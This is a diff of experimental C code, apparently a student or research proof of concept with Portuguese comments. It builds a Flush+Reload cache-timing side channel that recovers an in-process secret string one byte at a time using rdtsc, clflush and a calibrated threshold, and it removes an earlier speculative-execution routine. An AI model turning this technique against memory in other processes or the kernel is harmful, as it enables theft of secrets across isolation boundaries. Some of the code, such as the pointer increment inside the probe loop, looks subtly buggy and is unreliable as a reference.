@@ -1,8 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define NUM_ITERACOES 1000
+#define NUM_ITERACOES 10
 #define CACHE_LINE_LEN	128
+#define LEN_MEM_ARRAY	50
+
+
+static inline void Flush(char *);
 
 unsigned GetDS(){
 	unsigned ds;
@@ -17,7 +21,7 @@ void PrintLista(int lista[])
 	printf("Possiveis valores: ");
 	for (int i=0; lista[i]!=-1;i++)
 	{
-		printf(" %i",lista[i]);
+		printf(" %i = %c",lista[i],lista[i]);
 	}
 	printf("\n");
 }
@@ -28,8 +32,7 @@ char p1[] = 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
 
-
-int Probe(char *addr) {
+static inline long ProbeFlush(char *addr) {
 	/*ignora as otimizacoes*/
 	volatile unsigned long tempo;
 	/*exploit quase original*/
@@ -39,7 +42,29 @@ int Probe(char *addr) {
 				"  rdtsc              ;"
 				"  lfence             ;"
 				"  mov %%eax, %%esi  ;"	
-				"  mov (%1), %%eax   ;"
+				"  mov (%1), %%al   ;"
+				"  lfence             ;"
+				"  rdtsc              ;"
+				"  sub %%esi, %%eax   ;"
+				: "=a" (tempo)
+				: "c" (addr)
+   			);
+	Flush(addr);
+  return tempo;
+}
+
+
+static inline long Probe(char *addr) {
+	/*ignora as otimizacoes*/
+	volatile unsigned long tempo;
+	/*exploit quase original*/
+	asm __volatile__ (
+				"  mfence             ;"
+				"  lfence             ;"
+				"  rdtsc              ;"
+				"  lfence             ;"
+				"  mov %%eax, %%esi  ;"	
+				"  mov (%1), %%al   ;"
 				"  lfence             ;"
 				"  rdtsc              ;"
 				"  sub %%esi, %%eax   ;"
@@ -49,11 +74,13 @@ int Probe(char *addr) {
   return tempo;
 }
 
-void Flush(char *addr)
+static inline void Flush(char *addr)
 {
 	asm __volatile__(
 			"mfence		;"
 			"clflush 0(%0)	;"
+			"mfence		;"
+			"lfence		;"
 			: : "r" (addr)
 			);
 }
@@ -62,20 +89,34 @@ void Flush(char *addr)
 
 
 
-unsigned Treshold(unsigned iteracoes,char *base)
+unsigned Treshold(char *baseSrc)
 {
 
+	char* base=baseSrc;
 	unsigned i=0;
+	unsigned j=0;
+	unsigned probe;
 	unsigned long long totalComFlush=0;
 	unsigned long long totalSemFlush=0;
-	Flush(base);
-	while (i<iteracoes)
+	//Flush(base);
+	while (i<NUM_ITERACOES)
 	{
-		Flush(p1);
-		totalComFlush+=Probe(base);
-		totalSemFlush+=Probe(base);
-		Flush(base);
-		i++;
+		for (j=0;j<255;j++)
+		{
+		
+		
+			//Flush(base+j*4096);
+			probe=Probe(base+j*4096);
+			totalComFlush+=probe;
+			//printf("com flush %8X\n",probe);
+		
+			probe=ProbeFlush(base+j*4096);
+			totalSemFlush+=probe;
+			i++;
+		
+			//printf("sem flush %8X\n",probe);
+	
+		}
 	}
 	totalComFlush=totalComFlush/(i);
 	totalSemFlush=totalSemFlush/(i);
@@ -87,26 +128,6 @@ unsigned Treshold(unsigned iteracoes,char *base)
 
 }
 
-void speculate(unsigned long *array,void *base)
-{
-
-	asm __volatile__(
-			"mov %0, %%rcx	\n"
-			"mov %1, %%r9	\n"
-			"mov $100,%%rsi	\n"
-			"repeat:			\n" 
-			"	mov $0,%%eax		\n"
-			"	mov (%%rcx),%%rbx		\n"
-			"	mov (%%rbx), %%al			\n"
-			"	mov %%rbx,al(%%r9)		\n"
-			"	dec %%rsi			\n"
-			"	jnz repeat			\n"
-
-			:  : "r" (array) ,"r" (base)
-			);
-
-
-}
 void fillArray(unsigned long array[],unsigned long addr)
 {
 	for(int i=0;i<200;i++){
@@ -116,58 +137,92 @@ void fillArray(unsigned long array[],unsigned long addr)
 }
 
 
-void FlushAll(void *base)
+static inline void FlushAll(void *base)
 {
-	void *inicio=base;
-	for (int i=0; i <= 255 ; i++){
-		
+	register char *inicio=base;
+	for (register int i=0; i <= 255 ; i++){
 		Flush(inicio+i*4096);
 	}
 }
 
-void FindSecretLineCache(void *base,unsigned treshold,int lista[])
+static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[])
 {
-	//printf("inicio do segmento=%p\n",base);
-	unsigned x[256];
-	for (int i=0; i <= 255 ; i++)
+	void *base=baseSrc;
+	unsigned tempo;
+	int i=0;
+	int c=0;
+	while (i<256)
 	{
-		x[i]=Probe(base+i*4096);
+		
+		
+		tempo=Probe(base+i*4096);
+		//printf("i=%u,tempo=%8x\n",i,tempo);
+		if (tempo<treshold)
+		{
+			lista[c]=i;
+			c++;
+		}	
+		base++;
+		i++;
 	}
-	int contador=0;
-	for (int i=0; i <= 255 ; i++)
-	{
-		//printf("probe: add:%i - tempo- %i, treshold- %i\n",i,x[i],treshold);
-		//printf("probe: add:%i - tempo- %i\n",i,x[i]);
-		if (x[i] > treshold){
-			lista[contador]=i;
-			contador++;
-		}
+	lista[c]=-1;
+	return 0;
 
+
+}
+
+void fillArrayMemSpace(char *memspace[],char *original[])
+{
+	//avoid calling clflush all the time.
+	char *bufferFill;
+	for(int i=0;i<LEN_MEM_ARRAY;i++)
+	{
+		
+		bufferFill=(char *)malloc(4096*256+0xFFFFFF);
+		original[i]=bufferFill;
+		bufferFill+=0xFFFFFF;
+		bufferFill=(char *)((unsigned long)bufferFill & 0xFFFFFFFFF000000);
+		memspace[i]=bufferFill;
 	}
-	lista[contador]=-1;
 }
 
 int main(void)
 {
-	char *bufferFill=malloc(4096*4000)+0xFFFFF;
-	unsigned treshold;
+	int ret,i;
 	int lista[256];
-	bufferFill=(char *)((unsigned long)bufferFill & 0xFFFFFFFFFFF00000);
+	unsigned treshold;
+	char *ptrArray;
+	
+	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
 
-	treshold=Treshold(NUM_ITERACOES,bufferFill);
-	printf("treshold=%08X\n",treshold);
-	printf("DS register = %08X\n",GetDS());
-	printf("p1=%p\n",bufferFill);
-	
-	
-	FlushAll(bufferFill);
-	
-	*(bufferFill+10*4096)='A';
-	
-	FindSecretLineCache(bufferFill,treshold,lista);
-	printf("aqui %i\n",lista[0]);
-	PrintLista(lista);
+	char *memspace[LEN_MEM_ARRAY];
+	char *original[LEN_MEM_ARRAY];
 
+	fillArrayMemSpace(memspace,original);
+
+	treshold=Treshold(memspace[0]);
+	//treshold=0x300;
+
+	for (i=1;i<LEN_MEM_ARRAY;i++ )
+	{
+	
+		ptrArray=memspace[i];
+		ret=*((int *)(ptrArray+(int)segredo[i-1]*4096));
+		FindSecretLineCache(ptrArray,treshold,lista);
+		PrintLista(lista);
+		FlushAll(ptrArray);
+		free(original[i]);	
+
+		
+	
+	}
+
+	//exit friendly
+	for (i=0;i< LEN_MEM_ARRAY;i++)
+	{
+		//free(original[i]);
+	}
+	return 0;
 
 }
 
